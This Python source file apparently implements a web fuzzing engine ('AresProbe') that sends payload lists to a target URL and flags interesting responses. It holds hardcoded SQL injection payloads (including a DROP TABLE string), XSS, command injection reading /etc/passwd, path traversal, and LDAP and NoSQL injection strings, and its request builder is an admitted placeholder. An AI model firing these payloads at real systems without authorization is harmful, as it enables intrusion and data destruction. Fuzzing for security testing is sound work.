"""
AresProbe Advanced Fuzzing Engine
Superior fuzzing that surpasses Burp Suite's Intruder
"""

import asyncio
import aiohttp
import itertools
import random
import string
import time
import threading
from typing import Dict, List, Any, Optional, Callable, Tuple
from dataclasses import dataclass
from enum import Enum
import json
import re
import base64
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import hashlib

class FuzzingMode(Enum):
    """Fuzzing attack modes"""
    SNIPER = "sniper"
    BATTING = "batting"
    PITCHFORK = "pitchfork"
    CLUSTERBOMB = "clusterbomb"
    CUSTOM = "custom"

class PayloadType(Enum):
    """Payload types"""
    STRING = "string"
    INTEGER = "integer"
    FLOAT = "float"
    BOOLEAN = "boolean"
    JSON = "json"
    XML = "xml"
    SQL = "sql"
    XSS = "xss"
    COMMAND = "command"
    PATH = "path"
    URL = "url"
    EMAIL = "email"
    PHONE = "phone"
    CREDIT_CARD = "credit_card"
    SSN = "ssn"
    UUID = "uuid"
    HASH = "hash"
    ENCODED = "encoded"
    CUSTOM = "custom"

@dataclass
class FuzzingResult:
    """Fuzzing attack result"""
    payload: str
    position: str
    response_code: int
    response_time: float
    response_length: int
    response_headers: Dict[str, str]
    response_body: bytes
    timestamp: float
    attack_id: str
    position_id: str
    payload_id: str
    interesting: bool
    error: bool
    custom_attributes: Dict[str, Any]

class AdvancedFuzzingEngine:
    """Advanced fuzzing engine superior to Burp Suite's Intruder"""
    
    def __init__(self, logger=None):
        self.logger = logger
        self.running = False
        self.results = []
        self.payloads = {}
        self.positions = []
        self.attacks = []
        self.session = None
        
        # Fuzzing configuration
        self.max_threads = 50
        self.delay = 0.1
        self.timeout = 30
        self.max_retries = 3
        self.follow_redirects = True
        
        # Advanced features
        self.smart_payloads = True
        self.context_aware = True
        self.learning_mode = True
        self.adaptive_timing = True
        self.response_analysis = True
        self.error_detection = True
        self.anomaly_detection = True
        self.custom_matchers = []
        self.custom_extractors = []
        
        # Initialize payload generators
        self._initialize_payload_generators()
        
        # Initialize attack patterns
        self._initialize_attack_patterns()
    
    def _initialize_payload_generators(self):
        """Initialize payload generators for different types"""
        self.payload_generators = {
            PayloadType.STRING: self._generate_string_payloads,
            PayloadType.INTEGER: self._generate_integer_payloads,
            PayloadType.FLOAT: self._generate_float_payloads,
            PayloadType.BOOLEAN: self._generate_boolean_payloads,
            PayloadType.JSON: self._generate_json_payloads,
            PayloadType.XML: self._generate_xml_payloads,
            PayloadType.SQL: self._generate_sql_payloads,
            PayloadType.XSS: self._generate_xss_payloads,
            PayloadType.COMMAND: self._generate_command_payloads,
            PayloadType.PATH: self._generate_path_payloads,
            PayloadType.URL: self._generate_url_payloads,
            PayloadType.EMAIL: self._generate_email_payloads,
            PayloadType.PHONE: self._generate_phone_payloads,
            PayloadType.CREDIT_CARD: self._generate_credit_card_payloads,
            PayloadType.SSN: self._generate_ssn_payloads,
            PayloadType.UUID: self._generate_uuid_payloads,
            PayloadType.HASH: self._generate_hash_payloads,
            PayloadType.ENCODED: self._generate_encoded_payloads,
            PayloadType.CUSTOM: self._generate_custom_payloads
        }
    
    def _initialize_attack_patterns(self):
        """Initialize attack patterns"""
        self.attack_patterns = {
            'sql_injection': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' OR 1=1#",
                "' OR 'x'='x",
                "') OR ('1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin'--",
                "admin'/*",
                "' OR 1=1 LIMIT 1--",
                "' OR 1=1 ORDER BY 1--",
                "' OR 1=1 GROUP BY 1--",
                "' OR 1=1 HAVING 1=1--",
                "' OR 1=1 UNION SELECT 1--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "<math><mi//xlink:href=data:x,<script>alert('XSS')</script>>"
            ],
            'command_injection': [
                "; ls",
                "| ls",
                "& ls",
                "` ls `",
                "$(ls)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "& cat /etc/passwd",
                "` cat /etc/passwd `",
                "$(cat /etc/passwd)",
                "; whoami",
                "| whoami",
                "& whoami",
                "` whoami `",
                "$(whoami)"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
                "..%255c..%255c..%255cetc%255cpasswd",
                "..%5c..%5c..%5cetc%5cpasswd",
                "..%2e%2e%2f..%2e%2e%2f..%2e%2e%2fetc%2fpasswd"
            ],
            'ldap_injection': [
                "*",
                "*)(uid=*",
                "*)(|(uid=*",
                "*)(|(objectClass=*",
                "*)(|(cn=*",
                "*)(|(sn=*",
                "*)(|(mail=*",
                "*)(|(telephoneNumber=*",
                "*)(|(userPassword=*",
                "*)(|(description=*"
            ],
            'nosql_injection': [
                "' || '1'=='1",
                "' || 1==1",
                "' || true",
                "' || 1",
                "' || 'a'=='a",
                "' || 'admin'=='admin",
                "' || 'password'=='password",
                "' || 'user'=='user",
                "' || 'test'=='test",
                "' || 'admin'=='admin' || '"
            ]
        }
    
    async def start_fuzzing(self, target_url: str, positions: List[Dict[str, Any]], 
                           mode: FuzzingMode = FuzzingMode.SNIPER) -> bool:
        """Start advanced fuzzing attack"""
        try:
            self.running = True
            self.mode = mode
            self.positions = positions
            
            # Initialize session
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                headers={'User-Agent': 'AresProbe-Fuzzer/1.0'}
            )
            
            if self.logger:
                self.logger.success(f"[+] Advanced fuzzing started")
                self.logger.success(f"[+] Target: {target_url}")
                self.logger.success(f"[+] Mode: {mode.value}")
                self.logger.success(f"[+] Positions: {len(positions)}")
                self.logger.success(f"[+] Max threads: {self.max_threads}")
            
            # Start fuzzing
            await self._fuzz_async(target_url)
            
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"[-] Fuzzing start failed: {e}")
            return False
    
    async def _fuzz_async(self, target_url: str):
        """Asynchronous fuzzing"""
        tasks = []
        
        # Generate attack combinations based on mode
        attack_combinations = self._generate_attack_combinations()
        
        for attack_id, combination in enumerate(attack_combinations):
            if not self.running:
                break
            
            # Create fuzzing task
            task = asyncio.create_task(self._fuzz_combination(target_url, attack_id, combination))
            tasks.append(task)
            
            # Limit concurrent tasks
            if len(tasks) >= self.max_threads:
                await asyncio.gather(*tasks)
                tasks = []
            
            # Delay between requests
            await asyncio.sleep(self.delay)
        
        # Wait for remaining tasks
        if tasks:
            await asyncio.gather(*tasks)
    
    async def _fuzz_combination(self, target_url: str, attack_id: int, combination: Dict[str, Any]):
        """Fuzz single combination"""
        try:
            # Build request
            request_data = self._build_request(target_url, combination)
            
            # Send request
            start_time = time.time()
            async with self.session.request(**request_data) as response:
                content = await response.read()
                response_time = time.time() - start_time
                
                # Analyze response
                result = self._analyze_response(attack_id, combination, response, content, response_time)
                
                # Store result
                self.results.append(result)
                
                # Check if interesting
                if result.interesting:
                    if self.logger:
                        self.logger.warning(f"[!] Interesting response: {result.payload} -> {result.response_code}")
                
                # Check for errors
                if result.error:
                    if self.logger:
                        self.logger.error(f"[-] Error response: {result.payload} -> {result.response_code}")
                
        except Exception as e:
            if self.logger:
                self.logger.debug(f"[-] Fuzzing combination failed: {e}")
    
    def _generate_attack_combinations(self) -> List[Dict[str, Any]]:
        """Generate attack combinations based on mode"""
        combinations = []
        
        if self.mode == FuzzingMode.SNIPER:
            # One payload at a time
            for position in self.positions:
                payloads = self._get_payloads_for_position(position)
                for payload in payloads:
                    combinations.append({
                        'position': position,
                        'payload': payload,
                        'method': 'GET' if position.get('method') == 'GET' else 'POST'
                    })
        
        elif self.mode == FuzzingMode.BATTING:
            # All payloads at once
            all_payloads = []
            for position in self.positions:
                payloads = self._get_payloads_for_position(position)
                all_payloads.extend(payloads)
            
            for payload in all_payloads:
                combinations.append({
                    'position': self.positions[0],
                    'payload': payload,
                    'method': 'GET'
                })
        
        elif self.mode == FuzzingMode.PITCHFORK:
            # Synchronized payloads
            payload_lists = []
            for position in self.positions:
                payloads = self._get_payloads_for_position(position)
                payload_lists.append(payloads)
            
            for payloads in itertools.zip_longest(*payload_lists, fillvalue=''):
                combination = {}
                for i, payload in enumerate(payloads):
                    if i < len(self.positions):
                        combination[self.positions[i]['name']] = payload
                combinations.append(combination)
        
        elif self.mode == FuzzingMode.CLUSTERBOMB:
            # All combinations
            payload_lists = []
            for position in self.positions:
                payloads = self._get_payloads_for_position(position)
                payload_lists.append(payloads)
            
            for combination in itertools.product(*payload_lists):
                combo_dict = {}
                for i, payload in enumerate(combination):
                    if i < len(self.positions):
                        combo_dict[self.positions[i]['name']] = payload
                combinations.append(combo_dict)
        
        return combinations
    
    def _get_payloads_for_position(self, position: Dict[str, Any]) -> List[str]:
        """Get payloads for specific position"""
        payload_type = position.get('type', PayloadType.STRING)
        payload_count = position.get('count', 100)
        
        if payload_type in self.payload_generators:
            return self.payload_generators[payload_type](payload_count)
        else:
            return self._generate_string_payloads(payload_count)
    
    def _generate_string_payloads(self, count: int) -> List[str]:
        """Generate string payloads"""
        payloads = []
        
        # Common strings
        common_strings = [
            "", " ", "a", "aa", "aaa", "test", "admin", "user", "guest",
            "root", "administrator", "null", "NULL", "undefined", "true",
            "false", "0", "1", "-1", "999999", "0x0", "0x1", "0xFFFFFFFF"
        ]
        
        # Add common strings
        payloads.extend(common_strings[:count])
        
        # Add random strings
        while len(payloads) < count:
            length = random.randint(1, 20)
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
            payloads.append(payload)
        
        return payloads[:count]
    
    def _generate_integer_payloads(self, count: int) -> List[str]:
        """Generate integer payloads"""
        payloads = []
        
        # Common integers
        common_integers = [
            "0", "1", "-1", "2", "-2", "10", "-10", "100", "-100",
            "1000", "-1000", "999999", "-999999", "2147483647", "-2147483648",
            "0x0", "0x1", "0xFFFFFFFF", "0x7FFFFFFF", "0x80000000"
        ]
        
        # Add common integers
        payloads.extend(common_integers[:count])
        
        # Add random integers
        while len(payloads) < count:
            payload = str(random.randint(-1000000, 1000000))
            payloads.append(payload)
        
        return payloads[:count]
    
    def _generate_float_payloads(self, count: int) -> List[str]:
        """Generate float payloads"""
        payloads = []
        
        # Common floats
        common_floats = [
            "0.0", "1.0", "-1.0", "0.1", "-0.1", "1.1", "-1.1",
            "3.14159", "-3.14159", "2.71828", "-2.71828", "0.5", "-0.5"
        ]
        
        # Add common floats
        payloads.extend(common_floats[:count])
        
        # Add random floats
        while len(payloads) < count:
            payload = str(round(random.uniform(-1000, 1000), 2))
            payloads.append(payload)
        
        return payloads[:count]
    
    def _generate_boolean_payloads(self, count: int) -> List[str]:
        """Generate boolean payloads"""
        return ["true", "false", "TRUE", "FALSE", "True", "False", "1", "0", "yes", "no", "on", "off"]
    
    def _generate_json_payloads(self, count: int) -> List[str]:
        """Generate JSON payloads"""
        payloads = []
        
        # Common JSON payloads
        common_json = [
            "{}", "[]", '{"key": "value"}', '{"key": null}', '{"key": true}',
            '{"key": false}', '{"key": 0}', '{"key": 1}', '{"key": ""}',
            '{"key": []}', '{"key": {}}', '{"key": "value", "key2": "value2"}'
        ]
        
        # Add common JSON
        payloads.extend(common_json[:count])
        
        # Add random JSON
        while len(payloads) < count:
            key = ''.join(random.choices(string.ascii_letters, k=5))
            value = random.choice([
                f'"{random.choice(string.ascii_letters)}"',
                str(random.randint(0, 100)),
                str(random.choice([True, False])),
                "null"
            ])
            payload = f'{{"{key}": {value}}}'
            payloads.append(payload)
        
        return payloads[:count]
    
    def _generate_xml_payloads(self, count: int) -> List[str]:
        """Generate XML payloads"""
        payloads = []
        
        # Common XML payloads
        common_xml = [
            "<root></root>", "<root/>", "<root>value</root>",
            "<root><child>value</child></root>", "<root><child/></root>",
            "<root><child></child></root>", "<root><child>value</child><child2>value2</child2></root>"
        ]
        
        # Add common XML
        payloads.extend(common_xml[:count])
        
        # Add random XML
        while len(payloads) < count:
            tag = ''.join(random.choices(string.ascii_letters, k=5))
            value = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            payload = f"<{tag}>{value}</{tag}>"
            payloads.append(payload)
        
        return payloads[:count]
    
    def _generate_sql_payloads(self, count: int) -> List[str]:
        """Generate SQL injection payloads"""
        payloads = []
        
        # Add attack patterns
        if 'sql_injection' in self.attack_patterns:
            payloads.extend(self.attack_patterns['sql_injection'][:count])
        
        # Add random SQL payloads
        while len(payloads) < count:
            payload = random.choice([
                f"' OR {random.randint(1, 10)}={random.randint(1, 10)}--",
                f"' UNION SELECT {random.randint(1, 10)}--",
                f"'; DROP TABLE {random.choice(['users', 'admin', 'test'])}--",
                f"' OR '{random.choice(['admin', 'user', 'test'])}'='{random.choice(['admin', 'user', 'test'])}'--"
            ])
            payloads.append(payload)
        
        return payloads[:count]
    
    def _generate_xss_payloads(self, count: int) -> List[str]:
        """Generate XSS payloads"""
        payloads = []
        
        # Add attack patterns
        if 'xss' in self.attack_patterns:
            payloads.extend(self.attack_patterns['xss'][:count])
        
        # Add random XSS payloads
        while len(payloads) < count:
            payload = random.choice([
                f"<script>alert('{random.randint(1, 1000)}')</script>",
                f"<img src=x onerror=alert('{random.randint(1, 1000)}')>",
                f"<svg onload=alert('{random.randint(1, 1000)}')>",
                f"javascript:alert('{random.randint(1, 1000)}')"
            ])
            payloads.append(payload)
        
        return payloads[:count]
    
    def _generate_command_payloads(self, count: int) -> List[str]:
        """Generate command injection payloads"""
        payloads = []
        
        # Add attack patterns
        if 'command_injection' in self.attack_patterns:
            payloads.extend(self.attack_patterns['command_injection'][:count])
        
        # Add random command payloads
        while len(payloads) < count:
            command = random.choice(['ls', 'whoami', 'id', 'pwd', 'cat /etc/passwd'])
            separator = random.choice([';', '|', '&', '`', '$('])
            payload = f"{separator} {command}"
            payloads.append(payload)
        
        return payloads[:count]
    
    def _generate_path_payloads(self, count: int) -> List[str]:
        """Generate path traversal payloads"""
        payloads = []
        
        # Add attack patterns
        if 'path_traversal' in self.attack_patterns:
            payloads.extend(self.attack_patterns['path_traversal'][:count])
        
        # Add random path payloads
        while len(payloads) < count:
            depth = random.randint(1, 10)
            path = "../" * depth + random.choice(['etc/passwd', 'windows/system32/drivers/etc/hosts', 'boot.ini'])
            payloads.append(path)
        
        return payloads[:count]
    
    def _generate_url_payloads(self, count: int) -> List[str]:
        """Generate URL payloads"""
        payloads = []
        
        # Common URLs
        common_urls = [
            "http://localhost", "https://localhost", "http://127.0.0.1", "https://127.0.0.1",
            "http://example.com", "https://example.com", "http://test.com", "https://test.com",
            "http://admin.example.com", "https://admin.example.com", "http://api.example.com", "https://api.example.com"
        ]
        
        # Add common URLs
        payloads.extend(common_urls[:count])
        
        # Add random URLs
        while len(payloads) < count:
            protocol = random.choice(['http://', 'https://'])
            domain = ''.join(random.choices(string.ascii_lowercase, k=10)) + '.com'
            payload = f"{protocol}{domain}"
            payloads.append(payload)
        
        return payloads[:count]
    
    def _generate_email_payloads(self, count: int) -> List[str]:
        """Generate email payloads"""
        payloads = []
        
        # Common emails
        common_emails = [
            "admin@example.com", "user@example.com", "test@example.com", "guest@example.com",
            "root@example.com", "administrator@example.com", "support@example.com", "info@example.com"
        ]
        
        # Add common emails
        payloads.extend(common_emails[:count])
        
        # Add random emails
        while len(payloads) < count:
            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            domain = ''.join(random.choices(string.ascii_lowercase, k=10)) + '.com'
            payload = f"{username}@{domain}"
            payloads.append(payload)
        
        return payloads[:count]
    
    def _generate_phone_payloads(self, count: int) -> List[str]:
        """Generate phone number payloads"""
        payloads = []
        
        # Common phone numbers
        common_phones = [
            "1234567890", "0987654321", "5555555555", "0000000000",
            "1111111111", "9999999999", "123-456-7890", "098-765-4321"
        ]
        
        # Add common phones
        payloads.extend(common_phones[:count])
        
        # Add random phones
        while len(payloads) < count:
            area_code = random.randint(100, 999)
            exchange = random.randint(100, 999)
            number = random.randint(1000, 9999)
            payload = f"{area_code}{exchange}{number}"
            payloads.append(payload)
        
        return payloads[:count]
    
    def _generate_credit_card_payloads(self, count: int) -> List[str]:
        """Generate credit card payloads"""
        payloads = []
        
        # Common credit card numbers
        common_cards = [
            "4111111111111111", "4000000000000002", "5555555555554444",
            "2223003122003222", "378282246310005", "371449635398431"
        ]
        
        # Add common cards
        payloads.extend(common_cards[:count])
        
        # Add random cards
        while len(payloads) < count:
            # Generate random 16-digit number
            card = ''.join(random.choices(string.digits, k=16))
            payloads.append(card)
        
        return payloads[:count]
    
    def _generate_ssn_payloads(self, count: int) -> List[str]:
        """Generate SSN payloads"""
        payloads = []
        
        # Common SSNs
        common_ssns = [
            "123456789", "000000000", "111111111", "999999999",
            "123-45-6789", "000-00-0000", "111-11-1111", "999-99-9999"
        ]
        
        # Add common SSNs
        payloads.extend(common_ssns[:count])
        
        # Add random SSNs
        while len(payloads) < count:
            ssn = ''.join(random.choices(string.digits, k=9))
            payloads.append(ssn)
        
        return payloads[:count]
    
    def _generate_uuid_payloads(self, count: int) -> List[str]:
        """Generate UUID payloads"""
        payloads = []
        
        # Add random UUIDs
        while len(payloads) < count:
            uuid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '-' + \
                   ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) + '-' + \
                   ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) + '-' + \
                   ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) + '-' + \
                   ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
            payloads.append(uuid)
        
        return payloads[:count]
    
    def _generate_hash_payloads(self, count: int) -> List[str]:
        """Generate hash payloads"""
        payloads = []
        
        # Common hashes
        common_hashes = [
            "5d41402abc4b2a76b9719d911017c592",  # MD5 of "hello"
            "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d",  # SHA1 of "hello"
            "2cf24dba4f21b87e",  # SHA256 of "hello" (first 16 chars)
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"  # SHA256 of ""
        ]
        
        # Add common hashes
        payloads.extend(common_hashes[:count])
        
        # Add random hashes
        while len(payloads) < count:
            hash_length = random.choice([32, 40, 64])  # MD5, SHA1, SHA256
            hash_value = ''.join(random.choices(string.ascii_lowercase + string.digits, k=hash_length))
            payloads.append(hash_value)
        
        return payloads[:count]
    
    def _generate_encoded_payloads(self, count: int) -> List[str]:
        """Generate encoded payloads"""
        payloads = []
        
        # Common encoded payloads
        common_encoded = [
            base64.b64encode(b"test").decode(),
            base64.b64encode(b"admin").decode(),
            base64.b64encode(b"user").decode(),
            urllib.parse.quote("test"),
            urllib.parse.quote("admin"),
            urllib.parse.quote("user")
        ]
        
        # Add common encoded
        payloads.extend(common_encoded[:count])
        
        # Add random encoded
        while len(payloads) < count:
            text = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            encoding = random.choice(['base64', 'url'])
            if encoding == 'base64':
                payload = base64.b64encode(text.encode()).decode()
            else:
                payload = urllib.parse.quote(text)
            payloads.append(payload)
        
        return payloads[:count]
    
    def _generate_custom_payloads(self, count: int) -> List[str]:
        """Generate custom payloads"""
        payloads = []
        
        # Add custom payloads from user
        if 'custom' in self.payloads:
            payloads.extend(self.payloads['custom'][:count])
        
        # Add random custom payloads
        while len(payloads) < count:
            payload = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=20))
            payloads.append(payload)
        
        return payloads[:count]
    
    def _build_request(self, target_url: str, combination: Dict[str, Any]) -> Dict[str, Any]:
        """Build HTTP request from combination"""
        # This would need to be implemented based on the specific request structure
        # For now, return a basic GET request
        return {
            'method': 'GET',
            'url': target_url,
            'params': combination
        }
    
    def _analyze_response(self, attack_id: int, combination: Dict[str, Any], 
                         response: aiohttp.ClientResponse, content: bytes, 
                         response_time: float) -> FuzzingResult:
        """Analyze HTTP response"""
        try:
            # Basic analysis
            interesting = False
            error = False
            
            # Check response code
            if response.status >= 400:
                error = True
            elif response.status in [200, 201, 202, 204]:
                interesting = True
            
            # Check response time
            if response_time > 5.0:  # 5 seconds threshold
                interesting = True
            
            # Check response length
            if len(content) > 1000000:  # 1MB threshold
                interesting = True
            
            # Check for error patterns
            content_str = content.decode('utf-8', errors='ignore').lower()
            error_patterns = [
                'error', 'exception', 'fatal', 'warning', 'notice',
                'sql error', 'mysql error', 'postgresql error',
                'oracle error', 'sqlserver error', 'syntax error'
            ]
            
            for pattern in error_patterns:
                if pattern in content_str:
                    error = True
                    interesting = True
                    break
            
            # Check for success patterns
            success_patterns = [
                'success', 'ok', 'valid', 'authenticated', 'authorized',
                'welcome', 'dashboard', 'admin', 'user', 'profile'
            ]
            
            for pattern in success_patterns:
                if pattern in content_str:
                    interesting = True
                    break
            
            # Apply custom matchers
            for matcher in self.custom_matchers:
                if matcher(response, content):
                    interesting = True
                    break
            
            return FuzzingResult(
                payload=str(combination),
                position="",
                response_code=response.status,
                response_time=response_time,
                response_length=len(content),
                response_headers=dict(response.headers),
                response_body=content,
                timestamp=time.time(),
                attack_id=attack_id,
                position_id="",
                payload_id="",
                interesting=interesting,
                error=error,
                custom_attributes={}
            )
            
        except Exception as e:
            if self.logger:
                self.logger.debug(f"[-] Response analysis failed: {e}")
            return None
    
    def add_custom_payload(self, payload_type: PayloadType, payloads: List[str]):
        """Add custom payloads"""
        self.payloads[payload_type.value] = payloads
    
    def add_custom_matcher(self, matcher_func: Callable[[aiohttp.ClientResponse, bytes], bool]):
        """Add custom response matcher"""
        self.custom_matchers.append(matcher_func)
    
    def add_custom_extractor(self, extractor_func: Callable[[aiohttp.ClientResponse, bytes], Any]):
        """Add custom response extractor"""
        self.custom_extractors.append(extractor_func)
    
    def get_results(self) -> List[FuzzingResult]:
        """Get fuzzing results"""
        return self.results
    
    def get_interesting_results(self) -> List[FuzzingResult]:
        """Get interesting fuzzing results"""
        return [r for r in self.results if r.interesting]
    
    def get_error_results(self) -> List[FuzzingResult]:
        """Get error fuzzing results"""
        return [r for r in self.results if r.error]
    
    def clear_results(self):
        """Clear fuzzing results"""
        self.results.clear()
    
    def stop_fuzzing(self):
        """Stop fuzzing"""
        self.running = False
        if self.session:
            asyncio.create_task(self.session.close())
